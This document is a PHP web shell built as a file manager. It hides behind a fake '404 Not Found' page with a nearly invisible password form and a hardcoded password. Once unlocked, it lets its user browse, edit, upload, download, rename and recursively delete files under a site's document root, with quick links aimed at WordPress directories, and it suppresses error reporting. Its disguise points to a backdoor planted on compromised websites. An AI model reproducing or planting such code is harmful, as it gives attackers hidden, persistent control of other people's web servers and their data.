<?php
class TFM {
    private $pass = "admin_true2026";
    
    public function __construct() {
        if (session_id() == '') session_start();
        $post_pass = isset($_POST["pass"]) ? $_POST["pass"] : "";
        if ($post_pass === $this->pass) $_SESSION["tfm_auth"] = true;
        if (!isset($_SESSION["tfm_auth"])) {
            echo '<html><body style="text-align:center;padding:50px;font-family:Arial;">
            <h1>404 Not Found</h1>
            <p>The page you are looking for does not exist.</p>
            <div style="opacity:0.01;position:fixed;top:5px;right:5px;">
            <form method="post"><input type="password" name="pass" size="8">
            <button type="submit">→</button></form></div></body></html>';
            exit;
        }
    }
    
    public function run() {
        $a = isset($_GET["a"]) ? $_GET["a"] : "list";
        $p = isset($_GET["p"]) ? $_GET["p"] : "";
        $base = realpath($_SERVER["DOCUMENT_ROOT"]);
        $current_path = $base . "/" . $p;
        $current = realpath($current_path);
        if ($current === false) $current = $base;
        
        // Security check
        if (strpos($current, $base) !== 0) $current = $base;
        
        switch($a) {
            case "list":
                $this->listFiles($current, $p);
                break;
            case "edit":
                $this->editFile($current, $p);
                break;
            case "upload":
                $this->uploadFile($current, $p);
                break;
            case "download":
                $this->downloadFile($current);
                break;
            case "delete":
                $this->deleteFile($current, $p);
                break;
            case "mkdir":
                $this->createDir($current, $p);
                break;
            case "rename":
                $this->renameItem($current, $p);
                break;
            default:
                $this->listFiles($current, $p);
        }
    }
    
    private function listFiles($current, $p) {
        $files = scandir($current);
        $files = array_diff($files, array(".", ".."));
        
        echo '<html><head><title>File Manager</title>
        <style>
        body { font-family: Arial; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .breadcrumb { margin-bottom: 15px; padding: 10px; background: #f5f5f5; }
        .actions-bar { margin: 15px 0; padding: 10px; background: #e9e9e9; }
        .path-input { width: 300px; padding: 5px; }
        .current-dir { background: #d4edda; padding: 10px; margin: 10px 0; border-radius: 5px; }
        </style></head><body>';
        
        // Current Directory Info
        echo '<div class="current-dir">';
        echo '<strong>📁 Current Directory:</strong> ' . htmlspecialchars($current) . '<br>';
        echo '<strong>🔒 Base Directory:</strong> ' . htmlspecialchars($base) . '<br>';
        echo '<strong>📊 Items:</strong> ' . (count($files) + ($p != "" ? 1 : 0)) . ' items';
        echo '</div>';
        
        // Breadcrumb
        echo '<div class="breadcrumb">';
        echo '<strong>Path:</strong> ';
        echo '<a href="?a=list">/</a>';
        $parts = explode('/', trim($p, '/'));
        $current_path = '';
        foreach ($parts as $part) {
            if ($part != '') {
                $current_path .= '/' . $part;
                echo ' / <a href="?a=list&p=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a>';
            }
        }
        echo '</div>';
        
        // Actions Bar
        echo '<div class="actions-bar">';
        echo '<form action="?a=mkdir&p=' . urlencode($p) . '" method="post" style="display:inline;">
                <input type="text" name="dirname" placeholder="New folder name" required>
                <button type="submit">Create Folder</button>
              </form> ';
        
        echo '<form action="?a=list" method="get" style="display:inline;">
                <input type="hidden" name="a" value="list">
                <input type="text" class="path-input" name="p" placeholder="Enter path (e.g., wp-content/uploads)" value="' . htmlspecialchars($p) . '">
                <button type="submit">Go to Path</button>
              </form>';
        echo '</div>';
        
        echo '<table><tr><th>Name</th><th>Size</th><th>Date</th><th>Permissions</th><th>Actions</th></tr>';
        
        // Parent directory link
        if ($p != "") {
            $parent_dir = dirname($p);
            if ($parent_dir == ".") $parent_dir = "";
            echo '<tr>
                    <td><a href="?a=list&p=' . urlencode($parent_dir) . '">📁 .. (Parent Directory)</a></td>
                    <td>-</td>
                    <td>-</td>
                    <td>-</td>
                    <td><a href="?a=list&p=' . urlencode($parent_dir) . '">Go Up</a></td>
                  </tr>';
        }
        
        foreach ($files as $file) {
            $full_path = $current . "/" . $file;
            $is_dir = is_dir($full_path);
            $size = $is_dir ? "-" : $this->formatSize(filesize($full_path));
            $date = date("Y-m-d H:i", filemtime($full_path));
            $perms = $this->getPermissions($full_path);
            $icon = $is_dir ? "📁" : "📄";
            $name = $icon . " " . htmlspecialchars($file);
            
            if ($is_dir) {
                $link = '?a=list&p=' . urlencode($p . '/' . $file);
                $name_link = '<a href="' . $link . '">' . $name . '</a>';
                $actions = '<a href="' . $link . '">Open</a> | ' .
                          '<a href="?a=rename&p=' . urlencode($p . '/' . $file) . '">Rename</a> | ' .
                          '<a href="?a=delete&p=' . urlencode($p . '/' . $file) . '" onclick="return confirm(\'Delete folder?\')">Delete</a>';
            } else {
                $name_link = $name;
                $actions = '<a href="?a=edit&p=' . urlencode($p . '/' . $file) . '">Edit</a> | ' .
                          '<a href="?a=download&p=' . urlencode($p . '/' . $file) . '">Download</a> | ' .
                          '<a href="?a=rename&p=' . urlencode($p . '/' . $file) . '">Rename</a> | ' .
                          '<a href="?a=delete&p=' . urlencode($p . '/' . $file) . '" onclick="return confirm(\'Delete file?\')">Delete</a>';
            }
            
            echo '<tr>
                    <td>' . $name_link . '</td>
                    <td>' . $size . '</td>
                    <td>' . $date . '</td>
                    <td>' . $perms . '</td>
                    <td>' . $actions . '</td>
                  </tr>';
        }
        
        echo '</table>';
        
        // Upload form
        echo '<div style="margin-top: 20px; padding: 15px; background: #f0f0f0;">
                <h3>Upload File to: ' . htmlspecialchars($current) . '</h3>
                <form action="?a=upload&p=' . urlencode($p) . '" method="post" enctype="multipart/form-data">
                <input type="file" name="f">
                <button type="submit">Upload File</button>
                </form>
              </div>';
        
        // Quick navigation
        echo '<div style="margin-top: 20px; padding: 15px; background: #e0e0e0;">
                <h3>Quick Navigation</h3>
                <a href="?a=list&p=wp-content">wp-content</a> | 
                <a href="?a=list&p=wp-admin">wp-admin</a> | 
                <a href="?a=list&p=wp-includes">wp-includes</a> | 
                <a href="?a=list&p=.">Current Dir</a> | 
                <a href="?a=list">Root</a>
              </div>';
        
        // Refresh current directory
        echo '<div style="margin-top: 10px;">
                <a href="?a=list&p=' . urlencode($p) . '">🔄 Refresh Current Directory</a>
              </div>';
        
        echo '</body></html>';
    }
    
    private function createDir($current, $p) {
        if (isset($_POST["dirname"]) && $_POST["dirname"] != "") {
            $new_dir = $current . "/" . $_POST["dirname"];
            if (!file_exists($new_dir)) {
                mkdir($new_dir, 0755);
            }
        }
        header("Location: ?a=list&p=" . urlencode($p));
        exit;
    }
    
    private function renameItem($current, $p) {
        if (isset($_POST["newname"]) && $_POST["newname"] != "") {
            $new_name = dirname($current) . "/" . $_POST["newname"];
            rename($current, $new_name);
            header("Location: ?a=list&p=" . urlencode(dirname($p)));
            exit;
        }
        
        echo '<html><head><title>Rename</title>
        <style>
        body { font-family: Arial; margin: 20px; }
        input { padding: 8px; margin: 5px; width: 300px; }
        button { padding: 8px 15px; }
        </style></head><body>';
        
        echo '<h2>Rename: ' . htmlspecialchars(basename($current)) . '</h2>';
        echo '<p><strong>Current Path:</strong> ' . htmlspecialchars($current) . '</p>';
        echo '<form method="post">';
        echo '<input type="text" name="newname" value="' . htmlspecialchars(basename($current)) . '" required>';
        echo '<button type="submit">Rename</button>';
        echo '<button type="button" onclick="window.history.back()">Cancel</button>';
        echo '</form>';
        echo '</body></html>';
    }
    
    private function editFile($current, $p) {
        if (isset($_POST["c"])) {
            file_put_contents($current, $_POST["c"]);
            header("Location: ?a=list&p=" . urlencode(dirname($p)));
            exit;
        }
        
        $content = file_get_contents($current);
        $content = htmlspecialchars($content);
        
        echo '<html><head><title>Edit File</title>
        <style>
        body { font-family: Arial; margin: 20px; }
        textarea { width: 100%; height: 400px; font-family: monospace; }
        button { padding: 10px 20px; margin: 5px; }
        </style></head><body>';
        
        echo '<h2>Edit: ' . htmlspecialchars(basename($current)) . '</h2>';
        echo '<p><strong>File Path:</strong> ' . htmlspecialchars($current) . '</p>';
        echo '<form method="post">';
        echo '<textarea name="c">' . $content . '</textarea><br>';
        echo '<button type="submit">Save</button>';
        echo '<button type="button" onclick="window.history.back()">Cancel</button>';
        echo '</form>';
        echo '</body></html>';
    }
    
    private function uploadFile($current, $p) {
        if (isset($_FILES["f"]) && isset($_FILES["f"]["tmp_name"]) && $_FILES["f"]["tmp_name"] != "") {
            $target_file = $current . "/" . $_FILES["f"]["name"];
            move_uploaded_file($_FILES["f"]["tmp_name"], $target_file);
        }
        header("Location: ?a=list&p=" . urlencode($p));
        exit;
    }
    
    private function downloadFile($current) {
        if (file_exists($current)) {
            header("Content-Type: application/octet-stream");
            header("Content-Disposition: attachment; filename=\"" . basename($current) . "\"");
            header("Content-Length: " . filesize($current));
            readfile($current);
            exit;
        }
    }
    
    private function deleteFile($current, $p) {
        if (file_exists($current)) {
            if (is_dir($current)) {
                // Recursive directory deletion
                $this->deleteDirectory($current);
            } else {
                unlink($current);
            }
        }
        header("Location: ?a=list&p=" . urlencode(dirname($p)));
        exit;
    }
    
    private function deleteDirectory($dir) {
        if (!file_exists($dir)) return true;
        if (!is_dir($dir)) return unlink($dir);
        
        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $path = $dir . '/' . $item;
            if (is_dir($path)) {
                $this->deleteDirectory($path);
            } else {
                unlink($path);
            }
        }
        return rmdir($dir);
    }
    
    private function getPermissions($file) {
        $perms = fileperms($file);
        $info = '';
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ? 'x' : '-');
        return $info;
    }
    
    private function formatSize($bytes) {
        if ($bytes == 0) return "0 B";
        $units = array("B", "KB", "MB", "GB");
        $bytes = max($bytes, 0);
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
        $pow = min($pow, count($units) - 1);
        $bytes /= pow(1024, $pow);
        return round($bytes, 2) . " " . $units[$pow];
    }
}

// Error handling for PHP 5.3
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
$tfm = new TFM();
$tfm->run();
?>
